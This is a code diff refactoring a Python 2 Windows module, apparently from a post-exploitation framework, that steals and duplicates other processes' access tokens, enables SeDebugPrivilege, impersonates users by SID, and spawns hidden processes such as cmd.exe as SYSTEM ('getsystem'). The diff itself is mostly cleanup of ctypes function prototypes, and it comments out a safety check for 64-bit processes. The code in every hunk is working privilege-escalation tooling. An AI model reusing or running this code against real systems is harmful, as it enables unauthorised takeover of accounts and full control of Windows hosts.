@@ -2,50 +2,55 @@
 #Author: ??? and original code from https://github.com/joren485/PyWinPrivEsc/blob/master/RunAsSystem.py
 #Contributor(s): @bobsecq
 
-import sys, os
-from ctypes import wintypes
+from ctypes.wintypes import *
 from ctypes import *
 import subprocess
-import psutil
-import ctypes
 import platform
+import psutil
+import sys
+import os
 
-LPVOID = c_void_p
-PVOID = LPVOID
-PSID = PVOID
-DWORD = c_uint32
-LPSTR = c_char_p
-HANDLE      = LPVOID
-INVALID_HANDLE_VALUE = c_void_p(-1).value
-LONG        = c_long
-WORD        = c_uint16
+LPVOID                          = c_void_p
+PVOID                           = LPVOID
+LPTSTR                          = LPSTR
+LPCTSTR                         = LPSTR
+PSID                            = PVOID
+DWORD                           = c_uint32
+LPSTR                           = c_char_p
+HANDLE                          = LPVOID
+INVALID_HANDLE_VALUE            = c_void_p(-1).value
+LONG                            = c_long
+WORD                            = c_uint16
 
-READ_CONTROL                     = 0x00020000L
-STANDARD_RIGHTS_READ             = READ_CONTROL
-STANDARD_RIGHTS_REQUIRED         = 0x000F0000L
+PROCESS_QUERY_INFORMATION       = 0x0400
+READ_CONTROL                    = 0x00020000L
+STANDARD_RIGHTS_READ            = READ_CONTROL
+STANDARD_RIGHTS_REQUIRED        = 0x000F0000L
+TOKEN_ASSIGN_PRIMARY            = 0x0001
+TOKEN_DUPLICATE                 = 0x0002
+TOKEN_IMPERSONATE               = 0x0004
+TOKEN_QUERY                     = 0x0008
+TOKEN_QUERY_SOURCE              = 0x0010
+TOKEN_ADJUST_PRIVILEGES         = 0x0020
+TOKEN_ADJUST_GROUPS             = 0x0040
+TOKEN_ADJUST_DEFAULT            = 0x0080
+TOKEN_ADJUST_SESSIONID          = 0x0100
+TOKEN_READ                      = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
+tokenprivs                      = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072L | 4))
+TOKEN_ALL_ACCESS                = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
+                                    TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
+                                    TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
+                                    TOKEN_ADJUST_SESSIONID)
 
-TOKEN_ASSIGN_PRIMARY    = 0x0001
-TOKEN_DUPLICATE         = 0x0002
-TOKEN_IMPERSONATE       = 0x0004
-TOKEN_QUERY             = 0x0008
-TOKEN_QUERY_SOURCE      = 0x0010
-TOKEN_ADJUST_PRIVILEGES = 0x0020
-TOKEN_ADJUST_GROUPS     = 0x0040
-TOKEN_ADJUST_DEFAULT    = 0x0080
-TOKEN_ADJUST_SESSIONID  = 0x0100
-TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
-tokenprivs  = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072L | 4))
-TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
-        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
-        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
-        TOKEN_ADJUST_SESSIONID)
-
-PROCESS_QUERY_INFORMATION = 0x0400
+SE_PRIVILEGE_ENABLED_BY_DEFAULT = (0x00000001)
+SE_PRIVILEGE_ENABLED            = (0x00000002)
+SE_PRIVILEGE_REMOVED            = (0x00000004)
+SE_PRIVILEGE_USED_FOR_ACCESS    = (0x80000000)
 
 class TOKEN_INFORMATION_CLASS:
     #see http://msdn.microsoft.com/en-us/library/aa379626%28VS.85%29.aspx
-    TokenUser = 1
-    TokenGroups = 2
+    TokenUser       = 1
+    TokenGroups     = 2
     TokenPrivileges = 3
 
 class LUID(Structure):
@@ -59,6 +64,8 @@ class LUID(Structure):
     def __ne__(self, other):
         return not (self==other)
 
+PLUID = POINTER(LUID)
+
 class SID_AND_ATTRIBUTES(Structure):
     _fields_ = [
         ("Sid",         PSID),
@@ -69,19 +76,9 @@ class TOKEN_USER(Structure):
     _fields_ = [
         ("User", SID_AND_ATTRIBUTES),]
 
-SE_PRIVILEGE_ENABLED_BY_DEFAULT = (0x00000001)
-SE_PRIVILEGE_ENABLED            = (0x00000002)
-SE_PRIVILEGE_REMOVED            = (0x00000004)
-SE_PRIVILEGE_USED_FOR_ACCESS    = (0x80000000)
-
-LookupPrivilegeName = ctypes.windll.advapi32.LookupPrivilegeNameW
-LookupPrivilegeName.argtypes = (
-    wintypes.LPWSTR, # lpSystemName
-    ctypes.POINTER(LUID), # lpLuid
-    wintypes.LPWSTR, # lpName
-    ctypes.POINTER(wintypes.DWORD), #cchName
-    )
-LookupPrivilegeName.restype = wintypes.BOOL
+LookupPrivilegeName             = windll.advapi32.LookupPrivilegeNameW
+LookupPrivilegeName.argtypes    = [LPWSTR, POINTER(LUID), LPWSTR, POINTER(DWORD)]
+LookupPrivilegeName.restype     = BOOL
 
 class LUID_AND_ATTRIBUTES(Structure):
     _fields_ = [
@@ -95,8 +92,8 @@ class LUID_AND_ATTRIBUTES(Structure):
         self.Attributes |= SE_PRIVILEGE_ENABLED
 
     def get_name(self):
-        size = wintypes.DWORD(10240)
-        buf = ctypes.create_unicode_buffer(size.value)
+        size = DWORD(10240)
+        buf = create_unicode_buffer(size.value)
         res = LookupPrivilegeName(None, self.Luid, buf, size)
         if res == 0: raise RuntimeError
         return buf[:size.value]
@@ -111,6 +108,7 @@ class TOKEN_PRIVILEGES(Structure):
         ("PrivilegeCount",  DWORD),
         ("Privileges",      LUID_AND_ATTRIBUTES),
     ]
+PTOKEN_PRIVILEGES = POINTER(TOKEN_PRIVILEGES)
 
 class TOKEN_PRIVS(Structure):
     _fields_ = [
@@ -119,12 +117,11 @@ class TOKEN_PRIVS(Structure):
     ]
     def get_array(self):
         array_type = LUID_AND_ATTRIBUTES*self.PrivilegeCount
-        privileges = ctypes.cast(self.Privileges, ctypes.POINTER(array_type)).contents
+        privileges = cast(self.Privileges, POINTER(array_type)).contents
         return privileges
 
     def __iter__(self):
         return iter(self.get_array())
-
 
 class PROCESS_INFORMATION(Structure):
     _fields_ = [
@@ -156,9 +153,94 @@ class STARTUPINFO(Structure):
         ('hStdError',       HANDLE),
     ]
 
+class SECURITY_ATTRIBUTES(Structure):
+    _fields_ = [
+        ("nLength",                     DWORD),
+        ("lpSecurityDescriptor",        LPVOID),
+        ("bInheritHandle",              BOOL),
+    ]
+PSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)
+
+
+CloseHandle                         = windll.kernel32.CloseHandle
+CloseHandle.restype                 = BOOL
+CloseHandle.argtypes                = [HANDLE]
+
+AdjustTokenPrivileges               = windll.advapi32.AdjustTokenPrivileges
+AdjustTokenPrivileges.restype       = BOOL
+AdjustTokenPrivileges.argtypes      = [HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, POINTER(DWORD)]
+
+LookupPrivilegeValueA               = windll.advapi32.LookupPrivilegeValueA
+LookupPrivilegeValueA.restype       = BOOL
+LookupPrivilegeValueA.argtypes      = [LPCTSTR, LPCTSTR, PLUID]
+
+DuplicateTokenEx                    = windll.advapi32.DuplicateTokenEx
+DuplicateTokenEx.restype            = BOOL
+DuplicateTokenEx.argtypes           = [HANDLE, DWORD, PSECURITY_ATTRIBUTES, DWORD, DWORD, POINTER(HANDLE)]
+
+OpenProcessToken                    = windll.advapi32.OpenProcessToken
+OpenProcessToken.restype            = BOOL
+OpenProcessToken.argtypes           = [HANDLE, DWORD, POINTER(HANDLE)]
+
+GetTokenInformation                 = windll.advapi32.GetTokenInformation
+GetTokenInformation.restype         = BOOL
+GetTokenInformation.argtypes        = [HANDLE, DWORD, LPVOID, DWORD, POINTER(DWORD)]
+
+OpenProcess                         = windll.kernel32.OpenProcess
+OpenProcess.restype                 = HANDLE
+OpenProcess.argtypes                = [DWORD, BOOL, DWORD]
+
+LocalAlloc                          = windll.kernel32.LocalAlloc
+LocalAlloc.restype                  = HANDLE
+LocalAlloc.argtypes                 = [PSID, DWORD]
+
+ConvertSidToStringSidA              = windll.advapi32.ConvertSidToStringSidA
+ConvertSidToStringSidA.restype      = BOOL
+ConvertSidToStringSidA.argtypes     = [DWORD, POINTER(LPTSTR)]
+
+RevertToSelf                        = windll.advapi32.RevertToSelf
+RevertToSelf.restype                = BOOL
+RevertToSelf.argtypes               = []
+
+GetCurrentProcess                   = windll.kernel32.GetCurrentProcess
+GetCurrentProcess.restype           = HANDLE
+GetCurrentProcess.argtypes          = []
+
+GetCurrentProcessId                 = windll.kernel32.GetCurrentProcessId
+GetCurrentProcessId.restype         = DWORD
+GetCurrentProcessId.argtypes        = []
+
+LocalFree                           = windll.kernel32.LocalFree
+LocalFree.restype                   = HANDLE
+LocalFree.argtypes                  = [HANDLE]
+
+IsUserAnAdmin                       = windll.Shell32.IsUserAnAdmin
+IsUserAnAdmin.restype               = BOOL
+IsUserAnAdmin.argtypes              = []
+
+GetUserNameA                        = windll.advapi32.GetUserNameA
+GetUserNameA.restype                = BOOL
+GetUserNameA.argtypes               = [LPTSTR, POINTER(DWORD)]
+
+ImpersonateLoggedOnUser             = windll.advapi32.ImpersonateLoggedOnUser
+ImpersonateLoggedOnUser.restype     = BOOL
+ImpersonateLoggedOnUser.argtypes    = [HANDLE]
+
+CreateProcessAsUser                 = windll.advapi32.CreateProcessAsUserA
+CreateProcessAsUser.restype         = BOOL
+CreateProcessAsUser.argtypes        = [HANDLE, LPTSTR, LPTSTR, PSECURITY_ATTRIBUTES, PSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPTSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION)]
+
+CheckTokenMembership                = windll.advapi32.CheckTokenMembership
+CheckTokenMembership.restype        = BOOL
+CheckTokenMembership.argtypes       = [HANDLE, PSID, POINTER(BOOL)]
+
+CreateWellKnownSid                  = windll.advapi32.CreateWellKnownSid
+CreateWellKnownSid.restype          = BOOL
+CreateWellKnownSid.argtypes         = [DWORD, POINTER(PSID), LPVOID, POINTER(DWORD)]
+
 def GetUserName():
     nSize = DWORD(0)
-    windll.advapi32.GetUserNameA(None, byref(nSize))
+    GetUserNameA(None, byref(nSize))
     error = GetLastError()
 
     ERROR_INSUFFICIENT_BUFFER = 122
@@ -167,64 +249,66 @@ def GetUserName():
 
     lpBuffer = create_string_buffer('', nSize.value + 1)
 
-    success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
+    success = GetUserNameA(lpBuffer, byref(nSize))
     if not success:
         raise WinError()
     return lpBuffer.value
 
-
 def GetTokenSid(hToken):
+    
     """Retrieve SID from Token"""
+    
     dwSize = DWORD(0)
     pStringSid = LPSTR()
-    #print "hToken: %s"%hToken.value
     TokenUser = 1
-    r=windll.advapi32.GetTokenInformation(hToken, TokenUser, byref(TOKEN_USER()), 0, byref(dwSize))
-    if r!=0:
+    
+    r = GetTokenInformation(hToken, TokenUser, byref(TOKEN_USER()), 0, byref(dwSize))
+    if r != 0:
         raise WinError()
-    address = windll.kernel32.LocalAlloc(0x0040, dwSize)
-    windll.advapi32.GetTokenInformation(hToken, TokenUser, address, dwSize, byref(dwSize))
+    
+    address = LocalAlloc(0x0040, dwSize)
+    GetTokenInformation(hToken, TokenUser, address, dwSize, byref(dwSize))
     pToken_User = cast(address, POINTER(TOKEN_USER))
-    windll.advapi32.ConvertSidToStringSidA(pToken_User.contents.User.Sid, byref(pStringSid))
+    ConvertSidToStringSidA(pToken_User.contents.User.Sid, byref(pStringSid))
     sid = pStringSid.value
-    windll.kernel32.LocalFree(address)
+    LocalFree(address)
     return sid
 
 def EnablePrivilege(privilegeStr, hToken = None):
+    
     """Enable Privilege on token, if no token is given the function gets the token of the current process."""
+    
     if hToken == None:
-        TOKEN_ADJUST_PRIVILEGES = 0x00000020
-        TOKEN_QUERY = 0x0008
         hToken = HANDLE(INVALID_HANDLE_VALUE)
-        hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, windll.kernel32.GetCurrentProcessId())
-        windll.advapi32.OpenProcessToken( hProcess, (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken) )
-        e=GetLastError()
-        if e!=0:
+        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, GetCurrentProcessId())
+        OpenProcessToken(hProcess, (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken))
+        e = GetLastError()
+        if e != 0:
             raise WinError(e)
-        windll.kernel32.CloseHandle(hProcess)
+        CloseHandle(hProcess)
 
     privilege_id = LUID()
-    windll.advapi32.LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))
-    e=GetLastError()
-    if e!=0:
+    LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))
+    e = GetLastError()
+    if e != 0:
         raise WinError(e)
 
     SE_PRIVILEGE_ENABLED = 0x00000002
     laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
     tp  = TOKEN_PRIVILEGES(1, laa)
 
-    windll.advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)
-    e=GetLastError()
-    if e!=0:
+    AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)
+    e = GetLastError()
+    if e != 0:
         raise WinError(e)
 
 def ListSids():
     sids=[]
 
     # A well know bug in windows version > 8 (major >= 6.2) occurs when a "GetTokenSid" function is called from a 64 bits process. Stop it before its call
-    win_version = float("%s.%s" % (sys.getwindowsversion()[0], sys.getwindowsversion()[1]))
-    if "64" in platform.architecture()[0] and win_version > 6.1:
-        raise OSError("Can't let you to do that because a well known bug is not fixed yet, migrate to a 32 bits process and run this action again.\nEx: run migrate -c \'C:\\Windows\\SysWOW64\\notepad.exe\'")
+    # win_version = float("%s.%s" % (sys.getwindowsversion()[0], sys.getwindowsversion()[1]))
+    # if "64" in platform.architecture()[0] and win_version > 6.1:
+    #     raise OSError("Can't let you to do that because a well known bug is not fixed yet, migrate to a 32 bits process and run this action again.\nEx: run migrate -c \'C:\\Windows\\SysWOW64\\notepad.exe\'")
 
     for proc in psutil.process_iter():
         try:
@@ -236,39 +320,33 @@ def ListSids():
         if pinfo['username'] is None:
             continue
         try:
-            hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pinfo['pid']))
+            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pinfo['pid']))
             hToken = HANDLE(INVALID_HANDLE_VALUE)
-            windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
+            OpenProcessToken(hProcess, tokenprivs, byref(hToken))
 
             try:
                 sids.append((pinfo['pid'], pinfo['name'], GetTokenSid(hToken), pinfo['username']))
             except:
                 pass
-            windll.kernel32.CloseHandle(hToken)
-            windll.kernel32.CloseHandle(hProcess)
+            CloseHandle(hToken)
+            CloseHandle(hProcess)
         except Exception as e:
             print e
     return list(sids)
 
 
 def getProcessToken(pid):
-    hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
     hToken = HANDLE(INVALID_HANDLE_VALUE)
-    windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
-    windll.kernel32.CloseHandle(hProcess)
+    OpenProcessToken(hProcess, tokenprivs, byref(hToken))
+    CloseHandle(hProcess)
     return hToken
 
 def get_process_token():
     """
     Get the current process token
     """
-    GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
-    GetCurrentProcess.restype = wintypes.HANDLE
-    OpenProcessToken = ctypes.windll.advapi32.OpenProcessToken
-    OpenProcessToken.argtypes = (wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE))
-    OpenProcessToken.restype = wintypes.BOOL
-    token = wintypes.HANDLE()
-    TOKEN_ALL_ACCESS = 0xf01ff
+    token = HANDLE()
     res = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token)
     if not res > 0:
         raise RuntimeError("Couldn't get process token")
@@ -276,11 +354,10 @@ def get_process_token():
 
 def gethTokenFromPid(pid):
     try:
-        hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pid))
+        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pid))
         hToken = HANDLE(INVALID_HANDLE_VALUE)
-        windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
-
-        windll.kernel32.CloseHandle(hProcess)
+        OpenProcessToken(hProcess, tokenprivs, byref(hToken))
+        CloseHandle(hProcess)
         return hToken
     except Exception, e :
         print "[!] Error:" + str(e)
@@ -314,53 +391,53 @@ def getSidToken(token_sid):
 def impersonate_pid(pid, close=True):
     EnablePrivilege("SeDebugPrivilege")
     hToken = getProcessToken(pid)
-    hTokendupe=impersonate_token(hToken)
+    hTokendupe = impersonate_token(hToken)
     if close:
-        windll.kernel32.CloseHandle(hTokendupe)
+        CloseHandle(hTokendupe)
     return hTokendupe
 
 def impersonate_sid(sid, close=True):
     EnablePrivilege("SeDebugPrivilege")
     hToken = getSidToken(sid)
-    hTokendupe=impersonate_token(hToken)
+    hTokendupe = impersonate_token(hToken)
     if close:
-        windll.kernel32.CloseHandle(hTokendupe)
+        CloseHandle(hTokendupe)
     return hTokendupe
 
 global_ref=None
 def impersonate_sid_long_handle(*args, **kwargs):
     global global_ref
-    hTokendupe=impersonate_sid(*args, **kwargs)
+    hTokendupe = impersonate_sid(*args, **kwargs)
     try:
         if global_ref is not None:
-            windll.kernel32.CloseHandle(global_ref)
+            CloseHandle(global_ref)
     except:
         pass
-    global_ref=hTokendupe
+    global_ref = hTokendupe
     return addressof(hTokendupe)
 
 def impersonate_pid_long_handle(*args, **kwargs):
     global global_ref
-    hTokendupe=impersonate_pid(*args, **kwargs)
+    hTokendupe = impersonate_pid(*args, **kwargs)
     try:
         if global_ref is not None:
-            windll.kernel32.CloseHandle(global_ref)
+            CloseHandle(global_ref)
     except:
         pass
-    global_ref=hTokendupe
+    global_ref = hTokendupe
     return addressof(hTokendupe)
 
 def impersonate_token(hToken):
-    if not windll.Shell32.IsUserAnAdmin():
+    if not IsUserAnAdmin():
         raise OSError("You need admin rights to run impersonate !")
     EnablePrivilege("SeDebugPrivilege")
     #hToken = getProcessToken(pid)
     hTokendupe = HANDLE( INVALID_HANDLE_VALUE )
     SecurityImpersonation = 2
     TokenPrimary = 1
-    if not windll.advapi32.DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, byref( hTokendupe ) ):
+    if not DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, byref(hTokendupe)):
         WinError()
-    windll.kernel32.CloseHandle(hToken)
+    CloseHandle(hToken)
 
     try:
         EnablePrivilege("SeAssignPrimaryTokenPrivilege", hToken = hTokendupe)
@@ -375,19 +452,18 @@ def impersonate_token(hToken):
     except Exception as e:
         print e
 
-    if not windll.advapi32.ImpersonateLoggedOnUser(hTokendupe):
+    if not ImpersonateLoggedOnUser(hTokendupe):
         WinError()
 
     return hTokendupe
 
 def isSystem():
     sids = ListSids()
-    isSystem = False
     for sid in sids:
         if sid[0] == os.getpid():
             if sid[2] == "S-1-5-18":
-                isSystem = True
-    return isSystem
+                return True
+    return False
 
 def create_proc_as_sid(sid, prog="cmd.exe"):
 
@@ -397,12 +473,12 @@ def create_proc_as_sid(sid, prog="cmd.exe"):
             raise OSError("You need System privileges to impersonate a user token")
     else:
         # the user tries to getsystem
-        if not windll.Shell32.IsUserAnAdmin():
+        if not IsUserAnAdmin():
             raise OSError("You need admin rights to run getsystem !")
 
-    hTokendupe=impersonate_sid(sid, close=False)
-    pid=start_proc_with_token([prog], hTokendupe)
-    windll.kernel32.CloseHandle(hTokendupe)
+    hTokendupe = impersonate_sid(sid, close=False)
+    pid = start_proc_with_token([prog], hTokendupe)
+    CloseHandle(hTokendupe)
     return pid
 
 def getsystem(prog="cmd.exe"):
@@ -413,12 +489,12 @@ def start_proc_with_token(args, hTokendupe, hidden=True):
     lpProcessInformation = PROCESS_INFORMATION()
     lpStartupInfo = STARTUPINFO()
     if hidden:
-        lpStartupInfo.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
+        lpStartupInfo.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
         lpStartupInfo.wShowWindow = subprocess.SW_HIDE
 
-    CREATE_NEW_CONSOLE = 0x00000010
-    CREATE_UNICODE_ENVIRONMENT = 0x00000400
-    NORMAL_PRIORITY_CLASS = 0x00000020
+    CREATE_NEW_CONSOLE          = 0x00000010
+    CREATE_UNICODE_ENVIRONMENT  = 0x00000400
+    NORMAL_PRIORITY_CLASS       = 0x00000020
 
     dwCreationflag = NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE
 
@@ -431,7 +507,7 @@ def start_proc_with_token(args, hTokendupe, hidden=True):
     if not success:
         raise WinError()
 
-    success = windll.advapi32.CreateProcessAsUserA(hTokendupe, None, ' '.join(args), None, None, True, dwCreationflag, cenv, None, byref(lpStartupInfo), byref(lpProcessInformation))
+    success = CreateProcessAsUser(hTokendupe, None, ' '.join(args), None, None, True, dwCreationflag, cenv, None, byref(lpStartupInfo), byref(lpProcessInformation))
     if not success:
         raise WinError()
 
@@ -440,10 +516,10 @@ def start_proc_with_token(args, hTokendupe, hidden=True):
 
 def rev2self():
     global global_ref
-    windll.advapi32.RevertToSelf()
+    RevertToSelf()
     try:
         if global_ref is not None:
-            windll.kernel32.CloseHandle(global_ref)
+            CloseHandle(global_ref)
     except Exception, e:
         print e
         pass
@@ -454,16 +530,7 @@ def get_currents_privs():
     '''
     Get all privileges associated with the current process.
     '''
-    GetTokenInformation = ctypes.windll.advapi32.GetTokenInformation
-    GetTokenInformation.argtypes = [
-        wintypes.HANDLE, # TokenHandleTOKEN_PRIV
-        ctypes.c_uint, # TOKEN_INFORMATION_CLASS value
-        ctypes.c_void_p, # TokenInformation
-        wintypes.DWORD, # TokenInformationLength
-        ctypes.POINTER(wintypes.DWORD), # ReturnLength
-        ]
-    GetTokenInformation.restype = wintypes.BOOL
-    return_length = wintypes.DWORD()
+    return_length = DWORD()
     params = [
         get_process_token(),
         TOKEN_INFORMATION_CLASS.TokenPrivileges,
@@ -472,12 +539,12 @@ def get_currents_privs():
         return_length,
     ]
     res = GetTokenInformation(*params)
-    buffer = ctypes.create_string_buffer(return_length.value)
+    buffer = create_string_buffer(return_length.value)
     params[2] = buffer
     params[3] = return_length.value
     res = GetTokenInformation(*params)
     assert res > 0, "Error in second GetTokenInformation (%d)" % res
-    privileges = ctypes.cast(buffer, ctypes.POINTER(TOKEN_PRIVS)).contents
+    privileges = cast(buffer, POINTER(TOKEN_PRIVS)).contents
     return privileges
 
 def can_get_admin_access():
@@ -486,37 +553,40 @@ def can_get_admin_access():
     Returns True if the user is in the administrator's group.
     Otherwise returns False
     """
-    SECURITY_MAX_SID_SIZE = 68
+    SECURITY_MAX_SID_SIZE       = 68
     WinBuiltinAdministratorsSid = 26
     ERROR_NO_SUCH_LOGON_SESSION = 1312
-    ERROR_PRIVILEGE_NOT_HELD = 1314
-    TokenLinkedToken = 19
+    ERROR_PRIVILEGE_NOT_HELD    = 1314
+    TokenLinkedToken            = 19
+    
     #  On XP or lower this is equivalent to has_root()
     if sys.getwindowsversion()[0] < 6:
-        return bool(ctypes.windll.shell32.IsUserAnAdmin())
+        return bool(IsUserAnAdmin())
+    
     #  On Vista or higher, there's the whole UAC token-splitting thing.
     #  Many thanks for Junfeng Zhang for the workflow: htttp://blogs.msdn.com/junfeng/archive/2007/01/26/how-to-tell-if-the-current-user-is-in-administrators-group-programmatically.aspx
-    proc = ctypes.windll.kernel32.GetCurrentProcess()
+
     #  Get the token for the current process.
+    proc = GetCurrentProcess()
     try:
-        token = ctypes.wintypes.HANDLE()
-        ctypes.windll.advapi32.OpenProcessToken(proc,TOKEN_QUERY,byref(token))
+        token = HANDLE()
+        OpenProcessToken(proc, TOKEN_QUERY, byref(token))
         try:
             #  Get the administrators SID.
-            sid = ctypes.create_string_buffer(SECURITY_MAX_SID_SIZE)
-            sz = ctypes.wintypes.DWORD(SECURITY_MAX_SID_SIZE)
+            sid = create_string_buffer(SECURITY_MAX_SID_SIZE)
+            sz = DWORD(SECURITY_MAX_SID_SIZE)
             target_sid = WinBuiltinAdministratorsSid
-            ctypes.windll.advapi32.CreateWellKnownSid(target_sid,None,byref(sid),byref(sz))
+            CreateWellKnownSid(target_sid, None, byref(sid), byref(sz))
             #  Check whether the token has that SID directly.
-            has_admin = ctypes.wintypes.BOOL()
-            ctypes.windll.advapi32.CheckTokenMembership(None,byref(sid),byref(has_admin))
+            has_admin = BOOL()
+            CheckTokenMembership(None, byref(sid), byref(has_admin))
             if has_admin.value:
                 return True
             #  Get the linked token.  Failure may mean no linked token.
-            lToken = ctypes.wintypes.HANDLE()
+            lToken = HANDLE()
             try:
                 cls = TokenLinkedToken
-                ctypes.windll.advapi32.GetTokenInformation(token,cls,byref(lToken),sizeof(lToken),byref(sz))
+                GetTokenInformation(token, cls, byref(lToken), sizeof(lToken), byref(sz))
             except WindowsError, e:
                 if e.winerror == ERROR_NO_SUCH_LOGON_SESSION:
                     return False
@@ -526,16 +596,16 @@ def can_get_admin_access():
                     raise
             #  Check if the linked token has the admin SID
             try:
-                ctypes.windll.advapi32.CheckTokenMembership(lToken,byref(sid),byref(has_admin))
+                CheckTokenMembership(lToken, byref(sid), byref(has_admin))
                 return bool(has_admin.value)
             finally:
-                ctypes.windll.kernel32.CloseHandle(lToken)
+                CloseHandle(lToken)
         finally:
-            ctypes.windll.kernel32.CloseHandle(token)
+            CloseHandle(token)
     except Exception,e:
         return None
     finally:
         try:
-            ctypes.windll.kernel32.CloseHandle(proc)
+            CloseHandle(proc)
         except Exception,e:
             pass
